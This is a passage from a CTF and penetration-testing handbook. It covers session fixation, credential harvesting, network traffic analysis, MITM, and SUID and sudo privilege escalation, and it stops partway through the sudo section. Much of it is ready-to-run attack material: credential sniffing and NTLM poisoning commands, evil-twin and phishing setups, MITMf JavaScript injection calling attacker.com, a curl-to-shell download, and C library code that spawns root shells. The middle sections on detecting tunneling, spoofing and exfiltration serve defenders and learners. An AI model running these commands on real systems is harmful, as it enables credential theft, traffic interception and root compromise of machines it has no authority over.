# 3. Compare session IDs
grep -v "^#" before_login.txt | awk '{print $7}'
grep -v "^#" after_login.txt | awk '{print $7}'

# If session ID unchanged, fixation is possible
diff before_login.txt after_login.txt
```

**Exploiting Session Fixation**

```bash
# Attacker sets session ID for victim
# 1. Get valid session: http://target.com/?PHPSESSID=attacker_chosen_id
# 2. Victim clicks link and logs in
# 3. Attacker uses same session ID:
curl -b "PHPSESSID=attacker_chosen_id" http://target.com/profile
```

## Credential Harvesting

Credential harvesting extracts usernames and passwords from network traffic, login portals, and authentication attempts.

### Network-Based Credential Extraction

**Automated Credential Harvesting**

```bash
# Using Bettercap credential sniffer
bettercap -iface eth0 -eval "set net.sniff.verbose false; net.sniff on; events.ignore net.sniff.mdns"

# Captured credentials appear in format:
# [type] source -> dest : username / password

# Using PCredz
python3 Pcredz -i eth0

# From pcap file
python3 Pcredz -f capture.pcap

# Verbose output
python3 Pcredz -v -f capture.pcap
```

**Protocol-Specific Credential Extraction**

```bash
# FTP credentials from pcap
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS" -T fields -e ftp.request.command -e ftp.request.arg | paste - -

# HTTP Basic Authentication
tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization | while read auth; do
  echo "$auth" | sed 's/Basic //' | base64 -d
  echo
done

# HTTP POST credentials (form login)
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data | grep -i "user\|pass\|login"

# Telnet credentials (harder due to character-by-character transmission)
tshark -r capture.pcap -Y "telnet" -T fields -e telnet.data

# SMTP AUTH
tshark -r capture.pcap -Y "smtp.req.command == AUTH" -T fields -e smtp.req.parameter
```

**NTLM Credential Capture**

```bash
# Using Responder for NTLM credential harvesting
responder -I eth0 -wrf

# Flags:
# -w: Start WPAD rogue proxy
# -r: Enable DHCP poisoning
# -f: Fingerprint hosts

# Captured NTLMv1/v2 hashes saved to:
# /usr/share/responder/logs/

# Crack captured hashes
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
john --format=netntlmv2 captured_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**LLMNR/NBT-NS Poisoning**

```bash
# Responder listens for LLMNR/NBT-NS queries
responder -I eth0 -wf

# When victim attempts to access non-existent share:
# \\fileserver\share
# Responder responds, captures NTLM hash

# Analyze captured hashes
cat /usr/share/responder/logs/*.txt
```

### Evil Twin / Rogue AP Credential Harvesting

**Hostapd-WPE (WPA Enterprise Credential Harvesting)**

```bash
# Configure hostapd-wpe.conf for evil twin
# /etc/hostapd-wpe/hostapd-wpe.conf

# Start rogue AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials/hashes in:
# /var/log/hostapd-wpe.log

# Challenge-response captured as:
# username: user@domain.com
# challenge: ...
# response: ...

# Crack with asleap
asleap -C challenge -R response -W wordlist.txt
```

**Fake Captive Portal**

```bash
# Set up fake AP with hostapd
# Create captive portal with fake login page
# Use dnsmasq for DHCP and DNS redirection

# Example minimal setup:
# 1. hostapd for AP
# 2. dnsmasq for DHCP/DNS
# 3. Apache/nginx for fake portal
# 4. iptables to redirect all traffic to portal

# Redirect all HTTP to portal
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination <portal_ip>:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <portal_ip>:443
```

### Phishing with SET (Social Engineer Toolkit)

```bash
# Start SET
setoolkit

# Common attack vectors:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 4) Site Cloner

# Example: Clone login page
# Select: Web Templates
# Enter target URL to clone
# SET hosts fake site and logs credentials

# Captured credentials saved to:
# /var/www/html/harvester_*.txt
```

## Network Traffic Analysis

Network traffic analysis examines packet patterns, protocols, and payloads to identify attack vectors, data exfiltration, and security weaknesses.

### Traffic Pattern Analysis

**Protocol Hierarchy Statistics**

```bash
# Using tshark
tshark -r capture.pcap -q -z io,phs

# Shows breakdown of protocols:
# Ethernet -> IP -> TCP/UDP -> Application protocols

# Identify unusual protocols or distributions
```

**Conversation Analysis**

```bash
# TCP conversations
tshark -r capture.pcap -q -z conv,tcp

# UDP conversations
tshark -r capture.pcap -q -z conv,udp

# IP endpoints with packet/byte counts
tshark -r capture.pcap -q -z endpoints,ip

# Top talkers (most active hosts)
tshark -r capture.pcap -q -z endpoints,ip | sort -k 4 -rn | head
```

**Bandwidth and Throughput Analysis**

```bash
# IO graph statistics
tshark -r capture.pcap -q -z io,stat,1  # 1-second intervals

# Protocol-specific bandwidth
tshark -r capture.pcap -q -z io,stat,1,"AVG(frame.len)frame.len"

# HTTP request rate
tshark -r capture.pcap -q -z io,stat,1,http.request
```

### Flow Analysis Tools

**Argus - Flow Monitoring**

```bash
# Start argus on interface
argus -d -e `hostname` -i eth0 -w /tmp/argus.log

# Read argus data
ra -r /tmp/argus.log

# Filter flows
ra -r /tmp/argus.log - tcp and port 80

# Top connections by bytes
ra -r /tmp/argus.log -s saddr daddr sport dport bytes -n 10

# Duration and byte statistics
ra -r /tmp/argus.log -s saddr daddr dur bytes
```

**NFDump - NetFlow Analysis**

```bash
# Convert pcap to netflow (using softflowd)
softflowd -i eth0 -n 127.0.0.1:9995

# Read netflow data
nfdump -r /path/to/netflow/files

# Top talkers
nfdump -r /path/to/files -s srcip -n 20

# Statistical analysis
nfdump -r /path/to/files -s record/bytes

# Time window analysis
nfdump -R /path/to/files -t 2025/10/26.12:00:00-2025/10/26.13:00:00
```

### SSL/TLS Traffic Analysis

**Certificate Inspection**

```bash
# Extract SSL certificates from pcap
tshark -r capture.pcap -Y "ssl.handshake.certificate" -T fields -e ssl.handshake.certificate

# Get certificate details
tshark -r capture.pcap -Y "ssl.handshake.certificate" -V | grep -A 20 "Certificate"

# Identify self-signed or expired certificates
tshark -r capture.pcap -Y "ssl.handshake.certificate" -T fields -e x509ce.dNSName -e x509af.utcTime
```

**SSL/TLS Version Detection**

```bash
# Identify SSL/TLS versions in use
tshark -r capture.pcap -Y "ssl.handshake.version" -T fields -e ssl.handshake.version | sort | uniq -c

# Detect SSLv3 (vulnerable to POODLE)
tshark -r capture.pcap -Y "ssl.handshake.version == 0x0300"

# Detect weak cipher suites
tshark -r capture.pcap -Y "ssl.handshake.ciphersuite" -T fields -e ssl.handshake.ciphersuite | sort | uniq
```

**SSL Decryption** (with private key)

```bash
# Wireshark: Edit -> Preferences -> Protocols -> TLS
# RSA keys list: Add server IP, port, protocol, key file path

# Using tshark with key
tshark -r capture.pcap -o "tls.keys_list:192.168.1.100,443,http,/path/to/private.key" -Y http

# Extract HTTP from decrypted TLS
tshark -r capture.pcap -o "tls.keys_list:ip,port,protocol,keyfile" -Y "http" -T fields -e http.request.uri
```

[Inference] SSL decryption requires the server's private key or pre-master secret, making it practical only in controlled CTF environments where keys are provided.

### DNS Traffic Analysis

**DNS Query Analysis**

```bash
# Extract DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# DNS responses
tshark -r capture.pcap -Y "dns.flags.response == 1" -T fields -e dns.qry.name -e dns.a

# Identify DNS tunneling (unusual query patterns)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | awk -F'.' '{print length($1)}' | sort -rn | head

# Long subdomain names may indicate data exfiltration via DNS

# Query frequency analysis
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq -c | sort -rn
```

**DNS Tunneling Detection**

```bash
# Using iodine detection
# Look for TXT/NULL record queries
tshark -r capture.pcap -Y "dns.qry.type == 16 || dns.qry.type == 10"

# Entropy analysis of DNS queries (high entropy = potential tunneling)
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name > dns_queries.txt
# Analyze with custom script or tools like dnscat2 detector
```

### Malware Traffic Analysis

**C2 Communication Detection**

```bash
# Beaconing detection (regular intervals)
tshark -r capture.pcap -T fields -e frame.time_relative -e ip.dst -Y "ip.dst == suspicious_ip" | awk '{print $1}' | uniq -c

# HTTP User-Agent anomalies
tshark -r capture.pcap -Y "http.user_agent" -T fields -e http.user_agent | sort | uniq -c

# Non-standard ports for HTTP/HTTPS
tshark -r capture.pcap -Y "http && tcp.port != 80 && tcp.port != 8080"

# IRC on non-standard ports (possible C2)
tshark -r capture.pcap -Y "irc"
```

**Data Exfiltration Indicators**

```bash
# Large uploads (POST requests with big payloads)
tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e frame.len -e http.host | awk '$1 > 10000'

# High-volume connections
tshark -r capture.pcap -q -z conv,tcp | sort -k 6 -rn | head

# Base64 encoded data in HTTP
tshark -r capture.pcap -Y "http" -T fields -e http.file_data | grep -E '^[A-Za-z0-9+/=]{50,}$'
```

### Network Baseline and Anomaly Detection

**Establish Baseline**

```bash
# Normal traffic patterns over time
tshark -r normal_traffic.pcap -q -z io,phs
tshark -r normal_traffic.pcap -q -z endpoints,ip

# Protocol distribution
tshark -r normal_traffic.pcap -q -z io,phs | grep -E "tcp|udp|icmp"

# Top services
tshark -r normal_traffic.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e tcp.dstport | sort | uniq -c | sort -rn
```

**Anomaly Detection**

```bash
# Port scan detection (many SYN packets, few responses)
tshark -r capture.pcap -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e ip.src | sort | uniq -c | sort -rn

# Failed connection attempts
tshark -r capture.pcap -Y "tcp.flags.reset == 1" -T fields -e ip.src -e ip.dst

# ICMP anomalies (ping sweeps, large payloads)
tshark -r capture.pcap -Y "icmp" -T fields -e ip.src -e icmp.type | sort | uniq -c

# Unusual protocols
tshark -r capture.pcap -Y "!tcp && !udp && !icmp" -T fields -e ip.proto | sort | uniq -c
```

### Traffic Correlation and Pivoting

**Cross-Reference Multiple Sources**

```bash
# Correlate timestamp between captures
# Capture 1: External network
# Capture 2: Internal host

# Find simultaneous events
tshark -r external.pcap -Y "ip.dst == target_ip" -T fields -e frame.time_epoch
tshark -r internal.pcap -Y "ip.src == target_ip" -T fields -e frame.time_epoch

# Join by timestamp for correlation analysis
```

**Session Reconstruction**

```bash
# Follow TCP stream
tshark -r capture.pcap -q -z follow,tcp,ascii,0 > stream_0.txt

# Extract all streams
for i in {0..100}; do
  tshark -r capture.pcap -q -z follow,tcp,ascii,$i > stream_$i.txt 2>/dev/null
done

# HTTP object extraction
tshark -r capture.pcap --export-objects http,./http_objects/

# FTP file reconstruction
tshark -r capture.pcap -Y "ftp-data" -w ftp_data.pcap
# Extract with binwalk or manual analysis
```

### Advanced Traffic Manipulation Detection

**Packet Timing Analysis**

```bash
# Inter-packet delays (detect tampering/replay) 
tshark -r capture.pcap -T fields -e frame.number -e frame.time_delta_displayed | awk '$2 > 0.5'

# Abnormal TTL values (routing anomalies/spoofing)
tshark -r capture.pcap -T fields -e ip.src -e ip.ttl | sort -k2 -n | uniq

# Duplicate packets (potential replay attack)
tshark -r capture.pcap -Y "tcp.analysis.duplicate_ack || tcp.analysis.retransmission"

# Out-of-order packets
tshark -r capture.pcap -Y "tcp.analysis.out_of_order"
````

**Fragmentation Analysis**

```bash
# IP fragmentation detection
tshark -r capture.pcap -Y "ip.flags.mf == 1 || ip.frag_offset > 0"

# Suspicious fragmentation patterns
tshark -r capture.pcap -Y "ip.fragment" -T fields -e ip.src -e ip.dst -e ip.frag_offset

# Overlapping fragments (evasion technique)
tshark -r capture.pcap -Y "ip.fragment.overlap"

# Small fragment sizes (potential IDS evasion)
tshark -r capture.pcap -Y "ip.fragment" -T fields -e ip.len | awk '$1 < 100'
````

**TCP Anomalies**

```bash
# Invalid flag combinations
tshark -r capture.pcap -Y "tcp.flags == 0x00"  # NULL scan
tshark -r capture.pcap -Y "tcp.flags == 0x29"  # XMAS scan
tshark -r capture.pcap -Y "tcp.flags == 0x05"  # FIN scan

# Invalid sequence numbers
tshark -r capture.pcap -Y "tcp.analysis.ack_lost_segment"

# Window size anomalies
tshark -r capture.pcap -T fields -e tcp.window_size | sort -n | uniq -c

# Zero window attacks
tshark -r capture.pcap -Y "tcp.window_size == 0"

# Reserved bits set
tshark -r capture.pcap -Y "tcp.flags.res == 1"
```

### Automated MITM Detection

**ARP Spoofing Detection**

```bash
# Monitor for duplicate IP addresses
tshark -r capture.pcap -Y "arp" -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac | sort | uniq -c | awk '$1 > 1'

# Detect ARP reply storms
tshark -r capture.pcap -Y "arp.opcode == 2" -T fields -e frame.time_epoch | uniq -c | awk '$1 > 10'

# Monitor MAC address changes for same IP
tshark -r capture.pcap -Y "arp" -T fields -e arp.src.proto_ipv4 -e arp.src.hw_mac | sort -k1 | uniq

# Active monitoring with arpwatch
arpwatch -i eth0 -f /var/log/arpwatch.log
tail -f /var/log/arpwatch.log  # Watch for changes
```

**SSL Stripping Detection**

```bash
# Monitor HTTP downgrade from HTTPS
tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort | uniq > http_hosts.txt
tshark -r capture.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name | sort | uniq > https_hosts.txt

# Compare lists - hosts appearing in http_hosts but should be HTTPS
comm -12 http_hosts.txt known_https_sites.txt

# Detect HSTS bypass attempts
tshark -r capture.pcap -Y "http.response" -T fields -e http.response.line | grep -i "strict-transport-security"
```

**DHCP Spoofing Detection**

```bash
# Multiple DHCP servers on network
tshark -r capture.pcap -Y "bootp.option.dhcp == 2" -T fields -e ip.src | sort | uniq -c

# Rogue DHCP offers
tshark -r capture.pcap -Y "bootp.option.dhcp == 2" -T fields -e bootp.option.dhcp_server_id -e bootp.option.router

# Monitor with dhcpwatch (active monitoring)
# Note: Most modern implementations would use custom scripts
```

### NetFlow/IPFIX Analysis

**nfcapd Collection**

```bash
# Start nfcapd collector
nfcapd -l /var/nfsen/profiles-data/live -p 9995

# Process collected data
nfdump -R /var/nfsen/profiles-data/live -s srcip/bytes -n 20

# Time-based analysis
nfdump -R /path/to/files -t 2025/10/26.10:00:00-2025/10/26.11:00:00

# Protocol distribution
nfdump -R /path/to/files -s proto/flows

# Port analysis
nfdump -R /path/to/files -s dstport/flows -n 30
```

**Flow-based Anomaly Detection**

```bash
# Detect port scanning
nfdump -R /path/to/files 'flags S and not flags A' -o extended | awk '{print $7}' | sort | uniq -c | sort -rn

# Identify long-duration connections (potential C2)
nfdump -R /path/to/files -o extended | awk '$13 > 3600 {print $0}'

# High packet rate (DDoS indicator)
nfdump -R /path/to/files -o extended | awk '$9/$13 > 1000 {print $0}'

# Data exfiltration (large outbound transfers)
nfdump -R /path/to/files 'src net 192.168.0.0/16 and bytes > 10000000' -o extended
```

### Wireless Traffic Analysis

**802.11 Frame Analysis**

```bash
# Capture wireless traffic (monitor mode required)
airmon-ng start wlan0
airodump-ng wlan0mon -w capture

# Analyze with tshark
tshark -r capture-01.cap -Y "wlan.fc.type == 0"  # Management frames
tshark -r capture-01.cap -Y "wlan.fc.type == 1"  # Control frames
tshark -r capture-01.cap -Y "wlan.fc.type == 2"  # Data frames

# Deauthentication attacks
tshark -r capture-01.cap -Y "wlan.fc.type_subtype == 12"

# Probe requests (client looking for networks)
tshark -r capture-01.cap -Y "wlan.fc.type_subtype == 4" -T fields -e wlan.ssid

# Beacon frames
tshark -r capture-01.cap -Y "wlan.fc.type_subtype == 8" -T fields -e wlan.ssid -e wlan.bssid
```

**WPA Handshake Capture**

```bash
# Extract handshake from capture
tshark -r capture-01.cap -Y "eapol" -w handshake.cap

# Verify handshake with aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake.cap

# Convert for hashcat
hcxpcapngtool -o hash.hc22000 handshake.cap

# Crack with hashcat
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### Covert Channel Detection

**ICMP Tunneling Detection**

```bash
# Large ICMP payloads
tshark -r capture.pcap -Y "icmp" -T fields -e data.len | awk '$1 > 64'

# ICMP data pattern analysis
tshark -r capture.pcap -Y "icmp" -T fields -e data.data

# Using icmpsh detector patterns
tshark -r capture.pcap -Y "icmp.type == 8 && data.len > 0" -T fields -e data.data | head -c 100

# High-frequency ICMP (potential tunnel)
tshark -r capture.pcap -Y "icmp" -T fields -e frame.time_epoch | uniq -c | awk '$1 > 50'
```

**HTTP Header Covert Channels**

```bash
# Unusual custom headers
tshark -r capture.pcap -Y "http" -T fields -e http.request.line -e http.host -e http.user_agent | grep -v "Mozilla\|Chrome\|Safari"

# Large Cookie values (potential data exfil)
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie | awk 'length > 500'

# Base64 in headers
tshark -r capture.pcap -Y "http" -T fields -e http.request.line | grep -E '[A-Za-z0-9+/]{50,}={0,2}'

# X-* custom headers
tshark -r capture.pcap -Y "http.request" -V | grep "X-" | sort | uniq
```

**DNS Covert Channels**

```bash
# High entropy domain names
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | while read domain; do
  echo "$domain" | python3 -c "import sys, math; s=sys.stdin.read().strip(); print(s, -sum([s.count(c)/len(s)*math.log2(s.count(c)/len(s)) for c in set(s)]))"
done | awk '$2 > 3.5'

# TXT record data exfiltration
tshark -r capture.pcap -Y "dns.qry.type == 16" -T fields -e dns.txt

# Subdomain length analysis
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | awk -F. '{print length($1)}' | sort -rn | head

# Query rate per domain
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn
```

### Statistical Analysis Tools

**CapAnalysis - Web-based PCAP Analysis**

```bash
# Install and run CapAnalysis
# Access via web interface

# Provides:
# - Flow visualization
# - Geolocation mapping
# - Protocol statistics
# - Automatic malware detection integration
```

**NetworkMiner - Passive Network Sniffer**

```bash
# CLI version (mono required)
mono NetworkMinerCLI.exe -r capture.pcap -o output_directory/

# Extracts:
# - Files transferred
# - Images
# - Credentials
# - Session information
# - OS fingerprints
# - Hostnames
```

**Moloch - Large Scale Packet Capture**

```bash
# Moloch requires setup but provides:
# - Indexed PCAP storage
# - Fast searching across terabytes
# - Metadata extraction
# - Web-based interface

# Query example via web UI:
# protocols == tls && tls.version == "TLSv1.0"
# ip.src == 192.168.1.0/24 && http.uri == "*admin*"
```

### Custom Traffic Analysis Scripts

**Python Scapy Analysis**

```python
#!/usr/bin/env python3
from scapy.all import *

# Load pcap
packets = rdpcap('capture.pcap')

# Extract credentials from HTTP
for pkt in packets:
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = str(pkt[Raw].load)
        if 'password=' in payload or 'user=' in payload:
            print(f"Credential found: {payload}")

# Detect port scan
syn_packets = {}
for pkt in packets:
    if pkt.haslayer(TCP) and pkt[TCP].flags == 'S':
        src = pkt[IP].src
        syn_packets[src] = syn_packets.get(src, 0) + 1

for ip, count in syn_packets.items():
    if count > 100:
        print(f"Possible port scan from {ip}: {count} SYN packets")
```

**Bash Analysis Script**

```bash
#!/bin/bash
# Extract unique IPs and connection counts

PCAP="capture.pcap"

echo "=== Top Talkers ==="
tshark -r $PCAP -T fields -e ip.src -e ip.dst | 
  tr '\t' '\n' | 
  sort | 
  uniq -c | 
  sort -rn | 
  head -20

echo -e "\n=== Protocol Distribution ==="
tshark -r $PCAP -q -z io,phs

echo -e "\n=== Suspicious Ports ==="
tshark -r $PCAP -Y "tcp.dstport > 1024 && tcp.flags.syn == 1" -T fields -e tcp.dstport | 
  sort | 
  uniq -c | 
  sort -rn | 
  head -20

echo -e "\n=== Failed Connections ==="
tshark -r $PCAP -Y "tcp.flags.reset == 1" -T fields -e ip.src -e ip.dst -e tcp.dstport | 
  sort | 
  uniq -c | 
  sort -rn
```

### Memory-Resident MITM Detection

**Detect ARP Cache Poisoning**

```bash
# Check ARP cache for duplicates
arp -a | awk '{print $4}' | sort | uniq -d

# Monitor ARP changes
watch -n 1 'arp -a'

# Using arping to verify gateway MAC
arping -I eth0 -c 1 192.168.1.1
# Compare with current ARP cache entry

# Detect with arpwatch
arpwatch -i eth0
# Alerts on email when ARP mappings change
```

**Route Verification**

```bash
# Verify routing table hasn't been modified
ip route show

# Trace route to known destination
traceroute -n 8.8.8.8

# Check for unexpected hops
mtr --report 8.8.8.8

# Compare with baseline routes
diff <(ip route show) baseline_routes.txt
```

### MITM Framework Testing (Ethical/Authorized Only)

**MITMf - Framework Integration**

```bash
# Basic MITM with injection
mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --target 192.168.1.100

# With credential harvesting
mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --target 192.168.1.100 --hsts

# JavaScript injection
mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --inject --js-url http://attacker.com/hook.js

# SMB authentication capture
mitmf --arp --spoof -i eth0 --gateway 192.168.1.1 --responder
```

[Unverified] MITMf development has been discontinued, but remains useful for understanding MITM concepts in controlled environments.

**mitmproxy - Interactive HTTPS Proxy**

```bash
# Start interactive proxy
mitmproxy -p 8080

# Transparent mode (requires iptables rules)
mitmproxy --mode transparent --showhost

# Save traffic
mitmproxy -w traffic_dump

# Replay traffic
mitmproxy -r traffic_dump

# Scripting with mitmproxy
mitmproxy -s inject_script.py

# Example script (inject_script.py):
# def response(flow):
#     if "text/html" in flow.response.headers.get("content-type", ""):
#         flow.response.text = flow.response.text.replace("</body>", "<script>alert('MITM')</script></body>")
```

**mitmweb - Web Interface**

```bash
# Start web interface
mitmweb -p 8080

# Access at http://127.0.0.1:8081

# Features:
# - Flow inspection
# - Request/response modification
# - Replay attacks
# - Export flows
```

---

**Critical MITM Defense Considerations**:

1. **Encryption**: TLS/SSL renders most traditional MITM attacks ineffective without compromising certificates
2. **Certificate Pinning**: Applications using certificate pinning prevent SSL stripping
3. **HSTS**: HTTP Strict Transport Security forces HTTPS connections
4. **ARP Static Entries**: Prevent ARP poisoning on critical infrastructure
5. **802.1X**: Port-based network access control limits rogue devices
6. **VPN/IPSec**: Encrypted tunnels protect against network-layer MITM

**CTF-Specific MITM Success Factors**:

1. **Timing**: Capture during active authentication sessions
2. **Protocol Selection**: Target unencrypted protocols (HTTP, FTP, Telnet)
3. **Session Token Lifetime**: Act quickly before token expiration
4. **Traffic Volume**: More traffic increases credential capture probability
5. **Filter Precision**: Targeted filters reduce noise and speed analysis

**Important Subtopics for Advanced Study**:

- **IPv6 MITM Techniques** (RA spoofing, DHCPv6 attacks)
- **SSL/TLS Downgrade Attacks** (POODLE, FREAK, Logjam)
- **BGP Hijacking** (AS path manipulation)
- **VLAN Hopping** (Switch spoofing, double tagging)
- **SMB Relay Attacks** (NTLMv2 relay for privilege escalation)

---

# Post-Exploitation Enumeration

# Privilege Escalation Vectors

## SUID/SGID Binary Exploitation

### Concept Overview

SUID (Set User ID) and SGID (Set Group ID) bits allow binaries to execute with the permissions of their owner rather than the executing user. Misconfigured SUID/SGID binaries owned by root become direct privilege escalation vectors.

### Enumeration Techniques

**Find all SUID binaries:**

```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
```

**Find all SGID binaries:**

```bash
find / -perm -g=s -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

**Combined SUID/SGID search with detailed output:**

```bash
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null
```

**Filter for interesting binaries:**

```bash
find / -perm -u=s -type f 2>/dev/null | grep -v "/snap/" | grep -v "/proc/"
```

### Common Exploitable SUID Binaries

**GTFOBins-Listed Binaries:**

These standard utilities allow privilege escalation when SUID-enabled:

**nmap (legacy versions with interactive mode):**

```bash
nmap --interactive
!sh
```

**vim/vi:**

```bash
vim -c ':!/bin/sh'
# or
vim
:set shell=/bin/sh
:shell
```

**find:**

```bash
find / -exec /bin/sh -p \; -quit
# or
find . -exec /bin/sh -p \;
```

**bash:**

```bash
bash -p
# -p flag preserves SUID privileges
```

**less/more:**

```bash
less /etc/passwd
!/bin/sh
```

**awk:**

```bash
awk 'BEGIN {system("/bin/sh")}'
```

**python/perl/ruby:**

```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
perl -e 'exec "/bin/sh";'
ruby -e 'exec "/bin/sh"'
```

**cp (for file overwrite):**

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
```

**tar:**

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**systemctl:**

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
/bin/bash -p
```

### Custom SUID Binary Exploitation

**Identify custom binaries:**

```bash
find / -perm -4000 -type f 2>/dev/null | grep -v "^/usr" | grep -v "^/bin"
```

**Analysis workflow:**

1. **Check binary characteristics:**

```bash
file /path/to/binary
strings /path/to/binary
ltrace /path/to/binary
strace /path/to/binary
```

2. **Look for dangerous functions:**

- System calls without absolute paths
- Insecure temporary file creation
- Buffer overflow vulnerabilities
- Format string vulnerabilities

3. **Path hijacking exploitation:**

If binary calls `service` without absolute path:

```bash
cd /tmp
echo '/bin/bash' > service
chmod +x service
export PATH=/tmp:$PATH
/path/to/vulnerable/suid/binary
```

4. **Library hijacking (LD_PRELOAD/LD_LIBRARY_PATH):**

[Inference] - This technique works when the binary doesn't use secure execution flags:

```bash
# Create malicious library
cat > /tmp/exploit.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
LD_PRELOAD=/tmp/exploit.so /path/to/suid/binary
```

5. **Symlink attacks:**

For binaries that operate on predictable temp files:

```bash
ln -s /etc/shadow /tmp/vulnerable_temp_file
/path/to/suid/binary
```

### SGID Exploitation Specifics

**Target SGID binaries in privileged groups:**

```bash
# Find SGID binaries and their groups
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null

# Common privileged groups: docker, lxd, disk, shadow, adm
```

**SGID shadow group exploitation:**

```bash
# If binary has SGID shadow
/vulnerable/binary
# Read /etc/shadow
cat /etc/shadow
# Crack password hashes or modify directly if writable
```

### Tools for SUID/SGID Analysis

**LinPEAS (Linux Privilege Escalation Awesome Script):**

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# or
./linpeas.sh -a 2>/dev/null
```

**Unix-privesc-check:**

```bash
unix-privesc-check standard > output.txt
unix-privesc-check detailed > output_detailed.txt
```

---

## Sudo Misconfiguration Exploitation

### Enumeration

**Check sudo privileges:**

```bash
sudo -l
```

**Output interpretation:**

- Commands listed after `(ALL : ALL)` can be run as any user
- `NOPASSWD:` means no password required
- Specific user contexts: `(root) NOPASSWD: /usr/bin/binary`

### Exploitation Patterns

**GTFOBins sudo entries:**

Consult GTFOBins (gtfobins.github.io) for sudo exploitation. Common examples:

**vim/vi:**

```bash
sudo vim -c ':!/bin/sh'
```

**less:**

```bash
sudo less /etc/profile
!/bin/sh
```

**find:**

```bash
sudo find . -exec /bin/sh \; -quit
```

**awk:**

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

**nmap:**

```bash
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

**env:**

```bash
sudo env /bin/sh
```

**ftp:**

```bash
sudo ftp
!/bin/sh
```

**git:**

```bash
sudo git -p help
!/bin/sh
```

**zip:**

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

**tar:**

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### Wildcard Injection

**Tar wildcard exploitation:**

If script runs: `sudo tar -czf backup.tar.gz *`

```bash
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "#!/bin/bash\nchmod +s /bin/bash" > shell.sh
chmod +x shell.sh
# Wait for script execution
/bin/bash -p
```

**Chown wildcard exploitation:**

If script runs: `sudo chown root:root *`

```bash
ln -s /etc/shadow shadow_link
# When chown runs, ownership of /etc/shadow changes
```

### LD_PRELOAD Sudo Exploitation

**Check for LD_PRELOAD preservation:**

```bash
sudo -l
# Look for: env_keep+=LD_PRELOAD
```

**Exploit if enabled:**

```bash
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <any_sudo_command>
```

### LD_LIBRARY_PATH Exploitation

**Check for preservation:**

```bash
sudo -l
# Look for: env_keep+=LD_LIBRARY_PATH
```

**Exploit technique:**

```bash
# Find a sudo binary that uses shared libraries
ldd /usr/sbin/apache2
# Hijack a library

mkdir /tmp/lib
cat > /tmp/lib/libcrypt.c << EOF
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/lib/libcrypt.so.1 /tmp/lib/libcrypt.c
sudo LD_LIBRARY_PATH=/tmp/lib /usr/sbin/apache2
```

### Shell Escaping from Sudo Commands

**If allowed to run script editors:**

```bash
sudo vi /etc/apache2/apache2.conf
# Then: :!/bin/bash
```

**If allowed to run package managers:**

```bash
# APT
sudo apt-get changelog apt
!/bin/sh

# Yum
sudo yum install -y package
# During install, spawn shell from RPM scripts
```

**If allowed to run programming language interpreters:**
